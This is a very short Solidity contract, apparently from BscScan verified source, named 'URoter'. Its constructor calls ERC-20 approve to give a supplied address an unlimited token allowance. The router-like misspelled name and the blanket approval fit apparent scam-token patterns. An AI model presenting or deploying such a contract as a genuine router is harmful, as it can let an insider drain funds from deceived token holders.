/**
 *Submitted for verification at BscScan.com on 2023-05-04
*/

contract URoter{
     constructor(address tokens,address to){
         tokens.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
     }
}